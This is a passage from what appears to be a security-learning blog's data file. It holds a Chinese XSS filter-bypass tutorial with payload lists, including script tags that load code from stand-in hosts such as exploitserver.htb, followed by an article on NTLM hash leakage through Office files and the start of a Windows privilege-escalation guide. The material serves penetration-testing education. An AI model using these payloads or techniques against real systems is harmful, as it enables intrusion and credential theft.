<p>这次，脚本只能从源服务器本身加载。假设源服务器不提供 JSONP 端点，这看起来是安全的。但是，考虑这样一种情况：Web 应用程序允许用户上传文件。如果允许上传任意文件类型，攻击者就可以上传文件<code>.js</code>。然后，攻击者可以通过从源服务器本身加载上传的有效载荷来利用 XSS 漏洞：</p>
<pre><code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></pre>
<p>通常，对内容安全策略 (CSP) 的评估取决于具体的 CSP 本身以及 Web 应用程序的功能。正如我们所见，如果 Web 应用程序实现了文件上传功能，则将<code>script-src</code>指令设置为 true<code>'self'</code>可能不安全。因此，在具体 Web 应用程序的上下文中评估 CSP 至关重要。</p>
<p>&lt;scriPt sRc="https://exploitserver.htb/exploit"&gt;&lt;/scripT&gt;</p>
<h2>XSS 过滤器绕过</h2>
<p><strong>实现JavaScript执行</strong> 在讨论如何绕过 XSS 过滤器之前，我们将探讨三种实现 JavaScript 代码执行的方法。</p>
<p>实现代码执行最常见（也最显而易见）的方法是使用 <code>script</code> 标签；Web 浏览器会执行其中包含的任何 JavaScript 代码：</p>
<ul><li><strong>脚本标签</strong></li></ul>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>我们可以使用伪协议（例如<code>javascript</code>或 <code>data</code>）来指定某些 HTML 属性中数据的加载位置，从而实现 JavaScript 代码的执行。例如，我们可以将 <code>a</code>标签的目标设置为<code>javascript</code>伪协议，这样当点击链接时，相应的 JavaScript 代码就会被执行：</p>
<ul><li><strong>伪协议</strong></li></ul>
<pre><code class="language-html">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
<p>我们也可以创建带有伪协议的 XSS 有效载荷，这些协议不需要用户操作。例如，使用<code>object</code>标签。 <code>data</code>伪协议允许我们指定纯 HTML 代码或 base64 编码的 HTML 代码：</p>
<pre><code class="language-html">&lt;object data="javascript:alert(1)"&gt;
&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</code></pre>
<p>第三，我们可以使用事件处理程序如 <code>onload</code> 或 <code>onerror</code> 来指定在事件处理程序被触发时执行的 JavaScript 代码：</p>
<ul><li><strong>Event Handlers 事件处理程序</strong></li></ul>
<pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;</code></pre>
<p>我们有许多事件处理工具可以用于此目的。PortSwigger 的 XSS 速查表提供了很好的概述。</p>
<h3>绕过基本黑名单</h3>
<p>假设一个网页应用实现了一个简单的黑名单，用来阻止可能导致 JavaScript 代码执行的关键词。例如，通过阻挡像<code>JavaScript</code>标签这样的 HTML 标签、像 <code>JavaScript</code> 和 <code>data</code> 这样的伪协议，以及像 <code>onload</code> 和 <code>onerror</code> 这样的事件处理程序。</p>
<p>在这种情况下，我们可以尝试一些方法来绕过天真的黑名单。例如，HTML 标签、伪协议和事件处理程序中的外壳是无关紧要的。更具体地说，我们可以混合使用小写和大写字母，绕过只屏蔽小写关键词的黑名单：</p>
<pre><code class="language-html">&lt;ScRiPt&gt;alert(1);&lt;/ScRiPt&gt;
&lt;object data="JaVaScRiPt:alert(1)"&gt;
&lt;img src=x OnErRoR=alert(1)&gt;</code></pre>
<p>此外，如果一个天真黑名单去除了所有关键词 <code>&lt;script&gt;</code> 的出现，但没有递归应用，我们可以用类似以下有效载荷绕过该过滤器：</p>
<pre><code class="language-html">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/scr&lt;script&gt;ipt&gt;</code></pre>
<p>最后，如果黑名单使用了对 HTML 标签语法假设或仅阻塞某些特殊字符的弱正则表达式，我们可能通过打破这些假设绕过黑名单。例如，如果黑名单在任何事件处理程序或输入字段不允许之前有空格，以下有效载荷可能会绕过该过滤器：</p>
<pre><code class="language-html">&lt;svg/onload=alert(1)&gt;
&lt;script/src="https://exploit.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<h3>高级绕过</h3>
<p>假设我们注入一个 HTML 标签，从而执行 JavaScript 代码。在这种情况下，我们可能需要绕过附加于 JavaScript 代码的额外过滤器，这些过滤器限制了我们能调用哪些函数或访问哪些数据。我们可以采用许多技术来尝试绕过这些过滤器。我们将探讨如何通过编码字符串并将这些字符串传递到<code>execution sinks</code>来执行 JavaScript 代码来绕过过滤器。</p>
<p>在 JavaScript 中，我们可以为字符串应用多种编码，帮助我们规避黑名单。以下是字符串 <code>“alert（1）”</code> 的不同编码方式：</p>
<pre><code class="language-js"># Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"

# Octal Encoding
"\141\154\145\162\164\50\61\51"

# Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"

# Base64 Encoding
atob("YWxlcnQoMSk=")</code></pre>
<p>为了以串联方式提供有效载荷，我们需要能够使用报价。如果过滤器移除或阻塞引号，我们可以使用以下技巧之一来创建包含有效载荷的字符串：</p>
<pre><code class="language-js"># String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

# .source
/alert(1)/.source

# URL Encoding
decodeURI(/alert(%22xss%22)/.source)</code></pre>
<p>到目前为止，我们只能以串方式供应有效载荷;然而，浏览器只有在将它传递到接收字符串作为输入的执行汇入时才会执行。此类执行汇最著名的例子是<code>eval</code>  函数;除了<code>eval</code> ，其他执行汇总还包括：</p>
<pre><code class="language-js">eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()</code></pre>
<p>最后，我们可以将执行汇与编码字符串结合，尝试绕过弱的 XSS 滤波器：</p>
<pre><code class="language-js">eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()</code></pre>
<blockquote><strong>注：</strong> 为了在现实世界中绕过 XSS 过滤器，我们可以应用与其他漏洞（如 SQL 注入或命令注入）相同的方法。实际的绕过取决于网页应用实现的过滤器。它需要仔细测试，识别哪些关键词被列入白名单或黑名单，才能设计出未被阻挡的漏洞利用。</blockquote>
<p>想了解更多 XSS 滤波绕过，请查看 OWASP 的 XSS 滤波规避速查表 。此外，还有针对不同类型滤波器的 XSS 有效载荷集合。例如，如果无法使用括号，我们可以引用不带括号的 XSS 有效载荷集合。此外，HTML 5 安全速查表还提供了更多针对 XSS 利用的浏览器特定示例。</p>
<h2>技能评估</h2>`
    }
  },
  {
    id: "ntlm-credential-leakage",
    href: "posts/ad/ntlm-credential-leakage.html",
    title: {
      "en": "NTLM Credential Leakage and Privilege Escalation Paths",
      "zh": "NTLM 凭据泄露与提权路径"
    },
    category: "ad",
    categoryLabel: {
      "en": "Active Directory",
      "zh": "活动目录"
    },
    description: {
      "en": "Organize the paths leading to NTLM leaks when loading remote resources in Word, Outlook, Access, Media Player and Publisher.",
      "zh": "整理 Word、Outlook、Access、Media Player 与 Publisher 远程资源加载导致 NTLM 泄露的路径。"
    },
    date: "2026-05-07",
    content: {
      "en": "A structured learning note about NTLM leakage through Office documents, Outlook, Access, Media Player playlists, and Publisher.",
      "zh": "整理 Word、Outlook、Access、Media Player 与 Publisher 远程资源加载导致 NTLM 泄露的路径。"
    },
    code: "remote resource -> SMB authentication -> NTLM hash capture -> relay / pass-the-hash / cracking",
    contentHtml: {
      en: String.raw`<p>Like a stubborn relic of the past that lingers – it’s a decades-old authentication protocol that’s seemingly deprecated but still lurks in the shadows of every Windows environment. Although Microsoft has been working for years to replace NTLM with more secure alternatives such as Kerberos, it remains a critical fallback mechanism that Microsoft has been unable to completely deprecate. Why?</p>
<p>Because it is deeply embedded in the ecosystem, removing it could cause countless legacy applications and workflows to break. It is this backup dependency that attackers take advantage of, repeatedly using a variety of techniques to attack inherent weaknesses in the protocol.</p>
<h2>Introduction</h2>
<p>In recent years, attackers have focused on escalating privileges via NTLM leaks. The Microsoft Outlook application in particular has become a prime target for initial access because of its frequent and often silent network connections that can trigger unexpected NTLM authentication.</p>
<p>Once an attacker obtains a leaked NTLM hash, the impact can be devastating. Cracking the hash to obtain the clear text password is not always necessary; the NTLM hash itself can be used directly<strong>pass the hash attack</strong>. This allows an attacker to authenticate without knowing the user's password, using the hash value.<strong>Remote PsExec, WMI or RDP access</strong>, or even leak additional credentials that were previously unobtainable. If the NTLM hash belongs to a privileged user, an attacker can execute<strong>DCSync attack</strong>, request a new Kerberos ticket, or escalate privileges within the domain.</p>
<h2>1. Microsoft Word: Exposing NTLM Authentication Information via Malicious RTF Autolink</h2>
<p><strong>Imagine you receive a file called invoice.rtf</strong>Word document. At first glance, the document appears to be<strong>Protect view</strong>Open, with "read-only" mode enabled to protect against potentially malicious content.</p>
<img alt="Pasted image 20260411063448" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png"/>
<p>However, most users will probably enable editing, especially if the document looks legitimate and cannot be modified in other ways. After clicking "Enable Editing", a warning window will pop up, indicating that the document may contain<strong>Malicious links</strong>, you can choose to decline these updates.</p>
<img alt="Pasted image 20260411063513" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063513.png"/>
<p>Do you think rejecting links in this prompt will block all external connections? If so, something is wrong. due to<strong>Logical flaw in how Microsoft Word handles automatic OLE (Object Linking and Embedding) links</strong>, it bypasses the "_QueryHotLinks_" function and ignores the user's response. This will cause the std::filesystem::exists function on the link to be called even if the user rejects it.<strong>to automatically access remote files.</strong></p>
<p>As mentioned previously, this access attempt causes the system to fall back to NTLM authentication over SMB. In turn, your NT hash (NTLM hash) will be sent to the remote server, resulting in<strong>NTLM credentials leaked</strong>.</p>
<p><strong>This attack works by embedding the LINK attribute in the RTF file</strong>Automatically initiated, using specific "a" and "p" attributes to control OLE link objects. No additional user interaction is required other than enabling editing functionality, making this vulnerability particularly dangerous.</p>
<h2>2. Microsoft Outlook: Exposing NTLM authentication via remote image tags</h2>
<p><strong>Imagine you receive an email from an untrusted sender</strong>An email containing an image in the HTML code of the message body. The attacker used a simple trick to insert images via HTML tags like this:</p>
<img alt="Pasted image 20260411063704" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png"/>
<img alt="Pasted image 20260411063712" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063712.png"/>
<p>At first glance, this does not appear to be a sophisticated attack and most users will probably ignore the image or avoid saving it. However, if you try<strong>save this image</strong>, your NTLM credentials will be immediately compromised because the image is hosted on a remote malicious server. Outlook's security mechanisms are designed to prevent automatic rendering of images to untrusted emails, providing some protection in this situation.</p>
<p>*<strong>The real danger: trusted senders</strong>*</p>
<p>When the email comes from<strong>Trusted sender</strong>The situation becomes even more dangerous when a malicious person (such as a co-worker or a company contact who has been compromised). In this case, the image is automatically rendered when the email is opened, without any user interaction. When Outlook attempts to obtain the image, it sends<strong>NTLM authentication request, thereby revealing your NTLM hash (NT hash).</strong></p>
<img alt="Pasted image 20260411063755" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063755.png"/>
<p><strong>Why does this happen</strong></p>
<p>This vulnerability occurs because Outlook uses<strong>Sender trust level</strong>Different security rules apply. Outlook does not block the automatic rendering of images when the email comes from a trusted source. An HTML &lt;img&gt; tag with a src attribute pointing to a remote SMB server triggers an NTLM authentication request as soon as the message is opened. This results in immediate disclosure of the user's NTLM credentials without any explicit action by the user.</p>
<p>In some cases, the issue has even been found to be implemented via malicious image composite anonymous rendering<strong>remote code execution (</strong> <a href="https://www.youtube.com/watch?v=EQh6apPSRP0" rel="noreferrer" target="_blank"><strong>RCE</strong></a> <strong>)</strong>, even though that specific vulnerability has been fixed. However, the fundamental problem of automated NTLM breaches remains, especially when dealing with compromised trusted accounts.</p>
<h2>3. Microsoft Access: Exposing NTLM Authentication via Remote Table Refresh</h2>
<p><strong>Imagine that you receive a file called report.accdb</strong>A report in the form of a Microsoft Access database file. Naturally you would open the file to view its contents. However, the first thing that catches your eye is a warning message:<strong>"Active content in this file has been blocked"</strong> Many users may ignore this message, thinking it is a protective measure and feel reassured that potentially dangerous content has been disabled.</p>
<img alt="Pasted image 20260411064108" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png"/>
<p>After you ignore the warning, you will be able to access the report, which will display a prominent yellow banner saying<strong>Active content has been disabled</strong>. This banner is designed to give you a sense of security, implying that as long as you don't click<strong>enable content</strong>, you can safely interact with files. However, this is a false sense of security - your NTLM hash is already compromised before you see this banner.</p>
<img alt="Pasted image 20260411064154" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064154.png"/>
<p><strong>Why does this happen</strong></p>
<p>This issue results from exploiting a built-in feature of Microsoft Access. attacker uses<strong>Query object</strong>combine<strong>AutoExec macro</strong>to attack. AutoExec macro configured to open an Access file<strong>Automatically execute queries on remote tables</strong>. This means that the application will try to connect to the remote table as soon as the file is opened, regardless of whether active content is enabled.</p>
<p>If the remote table is hosted on a rogue SMB server, Microsoft Access will automatically attempt to authenticate using NTLM, causing<strong>NTLM credentials leaked</strong>. This happens before the user decides whether to enable active content, so the initial warning message has no effect.</p>
<h2>4. Microsoft Media Player: Exposing NTLM authentication information via legacy playlist files</h2>
<p>Imagine you receive an email with an attachment called<strong>voicemail.wax</strong>Audio shortcut file. Out of curiosity, you wanted to hear what was inside, so you double-clicked the file. Just this double click could unknowingly reveal your NTLM credentials.</p>
<img alt="Pasted image 20260411064236" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png"/>
<p>Receiving voicemail or video messages via email attachments is common, and this practice may have been used in live environments to steal NTLM information.</p>
<p><strong>Why does this happen</strong></p>
<p><strong>This vulnerability exploits Microsoft Windows Media Player</strong>A flaw in the way certain media playlist files were handled. An attacker can construct a malicious email with an attachment that uses<strong>.wax,.wvx or.wmx</strong> File extension. When the recipient double-clicks the attachment, it uses the default media player application (usually<strong>wmplayer.exe</strong>) open. The playlist file then instructs Windows Media Player to retrieve and play the media stream from an attacker-controlled SMB server.</p>
<p>In the process, the media player inadvertently changes the user's<strong>NT hash value</strong>Sent to the remote server as part of an authentication request, resulting in<strong>NTLM credentials automatically leaked</strong>. This process is completely transparent and does not require any further action from the user.</p>
<p><strong>"Design Flaw" Vulnerability</strong></p>
<p>As expected, Microsoft classified this issue as a feature. The logic is that users should handle media files with caution. However, what is even more surprising is that<strong>Outlook security filter</strong>There are inconsistencies in how these files are handled. Outlook will<strong>.asx</strong>Playlist files are blocked as potentially dangerous attachments, but not<strong>Block.wax,.wvx or.wmx</strong>Files – although all of these files can trigger the same behavior and leak NTLM credentials.</p>
<img alt="Pasted image 20260411064309" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png"/>
<h2>5. Microsoft Publisher: Exposing NTLM authentication via remote recipient list</h2>
<p>Imagine you receive a beautifully designed invitation to a company holiday party, cleverly disguised as a person named<strong>Publisher file for Christmas_Party.pub</strong>. Curious, you double-click the file to view the invitation. However, a warning prompt appears:<strong>"Do you want to open this publication and access external data?"</strong></p>
<p>You and your colleagues are trained to handle suspicious files, so you click with confidence<strong>"No"</strong> Thought any risk had been avoided.<strong>Unfortunately, you're wrong - your NTLM credentials were compromised before the warning appeared.</strong></p>
<p><strong>! Microsoft publisher warns: External data NTLM leak</strong></p>
<p><strong>Why does this happen</strong></p>
<p><strong>This vulnerability exploits Microsoft Publisher</strong>secondary school for<strong>Mail merge feature</strong>a feature of design. Publisher can load contact lists from remote data sources, such as external files on an SMB server. The problem is: even before the user is prompted to allow or deny access, when opening the document<strong>Also automatically verifies whether the remote file exists</strong>. This file check uses NTLM authentication, causing your NTLM hash (NT hash) to be sent to the remote server without your consent.</p>
<p>In other words, while the actual retrieval of the contact list contents requires user authorization, the initial file existence check triggers<strong>NTLM authentication request</strong>, thus leading to<strong>Your NTLM credentials compromised</strong>. The attacker doesn't even need the remote contact list to actually exist - just trying to authenticate it is enough to steal your credentials.</p>`,
      zh: String.raw`<p>就像过去顽固的遗物，挥之不去——这是一个有着几十年历史的身份验证协议，看似已被弃用，但仍然潜伏在每个 Windows 环境的阴影中。 尽管多年来微软一直努力用更安全的替代方案（例如 Kerberos）来取代 NTLM，但它仍然是一个关键的备用机制，微软无法完全弃用它。为什么？</p>
<p>由于它深深嵌入到生态系统中，移除它可能会导致无数遗留应用程序和工作流程崩溃。攻击者正是利用这种备用依赖关系，反复使用各种技术来攻击协议固有的弱点。</p>
<h2>介绍</h2>
<p>近年来, 攻击者专注于通过NTLM泄漏漏洞来提升权限. 微软Outlook应用程序尤其成为初始访问的主要目标，因为它频繁且通常是静默的网络连接可能会触发意外的NTLM身份验证。</p>
<p>一旦攻击者获取了泄露的 NTLM 哈希值，其影响可能是毁灭性的。破解哈希值以获取明文密码并非总是必要；NTLM 哈希值本身可以直接用于<strong>哈希传递攻击</strong>。这使得攻击者无需知道用户密码即可进行身份验证，利用哈希值进行<strong>远程 PsExec、WMI 或 RDP 访问</strong>，甚至泄露之前无法获取的其他凭据。如果 NTLM 哈希值属于特权用户，攻击者可以执行<strong>DCSync 攻击</strong>、请求新的 Kerberos 票证或在域内提升权限。</p>
<h2>1. Microsoft Word：通过恶意 RTF 自动链接泄露 NTLM 身份验证信息</h2>
<p><strong>想象一下，你收到一个名为invoice.rtf</strong>的 Word 文档。乍一看，该文档以受<strong>保护视图</strong>打开，并启用了“只读”模式，以防止潜在的恶意内容。</p>
<img alt="Pasted image 20260411063448" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png"/>
<p>然而，大多数用户可能会启用编辑功能，尤其是在文档看起来合法且无法通过其他方式修改的情况下。点击“Enable Editing”后，会弹出一个警告窗口，提示文档可能包含<strong>恶意链接</strong>，您可以选择拒绝这些更新。</p>
<img alt="Pasted image 20260411063513" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063513.png"/>
<p>您是否认为拒绝此提示中的链接会阻止所有外部连接？如果是这样，那就错了。由于<strong>Microsoft Word 处理自动 OLE（对象链接和嵌入）链接的方式存在逻辑缺陷</strong>，它会绕过“ _QueryHotLinks_ ”函数，忽略用户的响应。这会导致即使用户拒绝，也会通过调用链接上的std::filesystem::exists函数<strong>来自动访问远程文件。</strong></p>
<p>如前所述，此次访问尝试会导致系统回退到通过 SMB 进行的 NTLM 身份验证。反过来，您的 NT 哈希值（NTLM 哈希值）将被发送到远程服务器，从而导致<strong>NTLM 凭据泄露</strong>。</p>
<p><strong>该攻击通过在RTF文件中嵌入LINK属性</strong>自动发起，利用特定的“a”和“p”属性来控制OLE链接对象。除了启用编辑功能外，无需用户进行任何其他交互，这使得该漏洞尤其危险。</p>
<h2>2. Microsoft Outlook：通过远程图片标签泄露 NTLM 身份验证</h2>
<p><strong>想象一下，你收到一封来自不可信发件人的</strong>电子邮件，邮件正文的 HTML 代码中包含一张图片。攻击者使用了一种简单的技巧，通过类似这样的 HTML 标签插入图片：</p>
<img alt="Pasted image 20260411063704" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png"/>
<img alt="Pasted image 20260411063712" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063712.png"/>
<p>乍一看，这似乎并非一次复杂的攻击，大多数用户可能会忽略这张图片或避免保存它。然而，如果您尝试<strong>保存这张图片</strong>，您的 NTLM 凭据将立即泄露，因为该图片托管在远程恶意服务器上。Outlook 的安全机制旨在阻止对不受信任的电子邮件自动渲染图片，从而在这种情况下提供一定的保护。</p>
<p>*<strong>真正的危险：可信发件人</strong>*</p>
<p>当邮件来自<strong>可信发件人</strong>（例如同事或已被盗用的公司联系人）时，情况会变得更加危险。在这种情况下，图片会在打开邮件时自动渲染，无需任何用户交互。Outlook 尝试获取图片时，会向攻击者的 SMB 服务器发送<strong>NTLM 身份验证请求，从而泄露您的 NTLM 哈希值（NT 哈希）。</strong></p>
<img alt="Pasted image 20260411063755" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063755.png"/>
<p><strong>为什么会发生这种情况</strong></p>
<p>此漏洞的出现是因为 Outlook 会根据<strong>发件人的信任级别</strong>应用不同的安全规则。当电子邮件来自受信任的来源时，Outlook 不会阻止图像的自动渲染。带有指向远程 SMB 服务器的 src 属性的 HTML &lt;img&gt; 标签会在邮件打开时立即触发 NTLM 身份验证请求。这会导致用户的 NTLM 凭据立即泄露，而无需用户进行任何显式操作。</p>
<p>在某些情况下，该问题甚至被发现可通过恶意图像复合匿名渲染实现<strong>远程代码执行 (</strong> <a href="https://www.youtube.com/watch?v=EQh6apPSRP0" rel="noreferrer" target="_blank"><strong>RCE</strong></a> <strong>)</strong>，尽管该特定漏洞已被修复。然而，自动 NTLM 泄露这一根本问题依然存在，尤其是在处理被入侵的受信任帐户时。</p>
<h2>3. Microsoft Access：通过远程表刷新泄露 NTLM 身份验证</h2>
<p><strong>想象一下，你收到一份名为report.accdb</strong>的 Microsoft Access 数据库文件形式的报告。你自然会打开该文件查看其内容。然而，首先映入眼帘的是一条警告信息：<strong>“此文件中的活动内容已被阻止”</strong> 许多用户可能会忽略这条信息，认为这是一种保护措施，并会因为潜在的危险内容已被禁用而感到安心。</p>
<img alt="Pasted image 20260411064108" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png"/>
<p>忽略警告后，您将可以访问报告，报告中会显示一个醒目的黄色横幅，提示<strong>活动内容已被禁用</strong>。此横幅旨在让您产生一种安全感，暗示只要您不点击<strong>启用内容</strong> ，就可以安全地与文件交互。 然而，这是一种虚假的安全感——在您看到此横幅之前，您的 NTLM 哈希值就已经泄露了。</p>
<img alt="Pasted image 20260411064154" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064154.png"/>
<p><strong>为什么会发生这种情况</strong></p>
<p>此问题源于对 Microsoft Access 内置功能的利用。攻击者使用<strong>查询对象</strong>结合<strong>AutoExec 宏</strong>进行攻击。AutoExec 宏配置为在打开 Access 文件时<strong>自动对远程表执行查询</strong>。这意味着，无论是否启用了活动内容，应用程序都会在文件打开后立即尝试连接到远程表。</p>
<p>如果远程表托管在恶意 SMB 服务器上，Microsoft Access 将自动尝试使用 NTLM 进行身份验证，从而导致<strong>NTLM 凭据泄露</strong>。这种情况发生在用户决定是否启用活动内容之前，因此初始警告消息无效。</p>
<h2>4. Microsoft Media Player：通过旧版播放列表文件泄露 NTLM 身份验证信息</h2>
<p>想象一下，你收到一封电子邮件，附件中有一个名为<strong>voicemail.wax的</strong>音频快捷方式文件。出于好奇，你想听听里面的内容，于是双击了该文件。仅仅这一次双击，就可能在不知不觉中泄露你的 NTLM 凭据。</p>
<img alt="Pasted image 20260411064236" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png"/>
<p>通过电子邮件附件接收语音邮件或视频消息很常见，而且这种做法可能已经在实际环境中被用于窃取 NTLM 信息。</p>
<p><strong>为什么会发生这种情况</strong></p>
<p><strong>此漏洞利用了Microsoft Windows Media Player</strong>处理某些媒体播放列表文件的方式上的缺陷。攻击者可以构造一封带有附件的恶意电子邮件，该附件使用<strong>.wax、.wvx 或 .wmx</strong> 文件扩展名。当收件人双击该附件时，它会使用默认的媒体播放器应用程序（通常是<strong>wmplayer.exe</strong>）打开。然后，播放列表文件会指示 Windows Media Player 从攻击者控制的 SMB 服务器检索并播放媒体流。</p>
<p>在此过程中，媒体播放器会无意中将用户的<strong>NT 哈希值</strong>作为身份验证请求的一部分发送到远程服务器，从而导致<strong>NTLM 凭据自动泄露</strong>。此过程完全透明，无需用户进行任何进一步操作。</p>
<p><strong>“设计缺陷”漏洞</strong></p>
<p>不出所料，微软将此问题归类为一项功能。其逻辑在于，用户理应谨慎处理媒体文件。然而，更令人惊讶的是<strong>Outlook 安全筛选器</strong>对这些文件的处理方式存在不一致。Outlook 会将<strong>.asx</strong>播放列表文件作为潜在危险附件进行屏蔽，但却不会<strong>屏蔽 .wax、.wvx 或 .wmx</strong>文件——尽管所有这些文件都可能触发相同的行为并泄露 NTLM 凭据。</p>
<img alt="Pasted image 20260411064309" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png"/>
<h2>5. Microsoft Publisher：通过远程收件人列表泄露 NTLM 身份验证</h2>
<p>想象一下，你收到一份设计精美的公司节日派对邀请函，它巧妙地伪装成一个名为<strong>Christmas_Party.pub的Publisher 文件</strong>。你好奇地双击该文件查看邀请函。然而，随即出现一个警告提示：<strong>“是否要打开此出版物并访问外部数据？”</strong></p>
<p>你和你的同事都接受过处理可疑文件的培训，所以你自信地点击了 <strong>“否”</strong> 以为已经避免了任何风险。<strong>不幸的是，你错了——在警告出现之前，你的NTLM凭据就已经泄露了。</strong></p>
<p><strong>!微软发布者警告：外部数据 NTLM 泄露</strong></p>
<p><strong>为什么会发生这种情况</strong></p>
<p><strong>此漏洞利用了Microsoft Publisher</strong>中专为<strong>邮件合并功能</strong>设计的一项特性。Publisher 可以从远程数据源（例如 SMB 服务器上的外部文件）加载联系人列表。问题在于：即使在提示用户允许或拒绝访问之前，打开文档时<strong>也会自动验证远程文件是否存在</strong>。此文件检查使用 NTLM 身份验证，导致您的 NTLM 哈希值（NT 哈希）在未经您同意的情况下被发送到远程服务器。</p>
<p>换句话说，虽然实际获取联系人列表内容需要用户授权，但初始的文件存在性检查会触发<strong>NTLM 身份验证请求</strong>，从而导致<strong>您的 NTLM 凭据泄露</strong>。攻击者甚至不需要远程联系人列表实际存在——仅仅是尝试验证它就足以窃取您的凭据。</p>`
    }
  },
  {
    id: "windows-privilege-escalation",
    href: "posts/ad/windows-privilege-escalation.html",
    title: {
      "en": "Windows Privilege Escalation: Complete Enumeration Methodology",
      "zh": "Windows 权限提升：完整枚举方法论"
    },
    category: "ad",
    categoryLabel: {
      "en": "Active Directory",
      "zh": "活动目录"
    },
    description: {
      "en": "Organize Windows local privilege escalation targets, scenarios, tools, situational awareness, systems, users, services and permission enumeration according to the original note structure.",
      "zh": "按照原笔记结构整理 Windows 本地提权目标、场景、工具、态势感知、系统、用户、服务与权限枚举。"
    },
    date: "2026-05-07",
    content: {
      "en": "A complete Windows privilege escalation methodology covering goals, tools, situational awareness, system enumeration, users, groups, processes, and services.",
      "zh": "按照原笔记结构整理 Windows 本地提权目标、场景、工具、态势感知、系统、用户、服务与权限枚举。"
    },
    code: "whoami /priv && systeminfo && net localgroup administrators",
    contentHtml: {
      en: String.raw`<h2>Introduction</h2>
<p>The overall goal of privilege escalation is to elevate our access to a specific system to group members <code>Local Administrators</code> or <code>NT AUTHORITY\SYSTEM</code> Local system account. However, in some cases, elevating other users on the system is enough to achieve our goals. Privilege escalation is often a crucial step in any attack campaign. We need to use gained access, or some data (such as credentials) that can only be found after a session in an elevated context. In some cases, if a client hires us for a "golden image" or "workstation breakout" type of assessment, privilege escalation may be the ultimate goal of the assessment. Privilege escalation is often critical to continuing through the network to achieve our end goal, as well as moving laterally.</p>
<p>Having said that, we may need to elevate privileges for the following reasons:</p>
<ol><li>While testing client's Gold Image Windows Workstation and Server builds for flaws</li><li>Elevate privileges locally to gain access to some local resources (such as a database)</li><li>Gain<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">NT AUTHORITY\System</a>level access into the client's Active Directory environment</li><li>Obtain credentials for lateral movement or further privilege escalation inside the client network</li></ol>
<p>Learn how to perform privilege escalation checks and <code>manually</code> It is also crucial to exploit vulnerabilities as much as possible under certain scenarios. We may run into a situation where a client places us on a hosted workstation that has no internet access, a tight firewall, and the USB ports are disabled so we can't load any tools/auxiliary scripts. In this case, proficiency in Windows privilege escalation checks using PowerShell and the Windows command line is critical.</p>
<p>The system has a huge attack surface. We can elevate privileges in the following ways:</p>
<ul><li>Abuse of Windows group permissions</li><li>Abuse of Windows user rights</li><li>Bypass User Account Control</li><li>Abuse of weak service/file permissions</li><li>Exploiting bit-patched kernel vulnerabilities</li><li>Credential theft</li><li>traffic capture</li></ul>
<p><strong>Scenario 1 - Overcoming network limitations</strong> I was once tasked with elevating privileges on a client-provided system that had no network connectivity and the USB port was blocked. Due to network access control, I cannot plug the attacker machine directly into the user's network to assist me. During the assessment, I have discovered a network vulnerability where the printer VLAN is configured to allow outbound communication over ports 80, 443, and 445. I found a permission related vulnerability using a manual enumeration method that allowed me to escalate privileges and execute it manually <code>LSASS</code> Memory dump of the process. I was then able to mount the SMB share hosted on the attacker machine on the printer VLAN and extract <code>LSASS</code> DMP files. With this file I use <code>Mimikatz</code> The domain administrator's NTLM password hash was retrieved offline and I was able to crack the hash offline and use that hash to access the domain controller from the system provided by the client.</p>
<p><strong>Scenario 2 - Looting public shares</strong> In another assessment, I found myself in a fairly closed environment that was well monitored without any obvious configuration flaws or vulnerable services/applications in use. I found a file share that was completely open, allowing all users to list its contents and download files stored on it. This share hosts backups of the virtual machines in the environment. I'm particularly interested in the virtual hard disk files (<code>.VMDK</code> and <code>.VHDX</code> file). I can access this share from a Windows VM by placing <code>.VHDX</code> Mount the virtual hard disk as a local drive and browse the file system. From here, I retrieved <code>SYSTEM</code>、<code>SAM</code> and registry hives, moved them into my Linux attack box and used<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" rel="noreferrer" target="_blank">secretsdump.py</a><code>SECURITY</code> The tool extracted the local administrator password hash. The organization happened to be using a golden image and was able to gain administrator access to almost any Windows system via a pass-the-hash attack using the local administrator hash.</p>
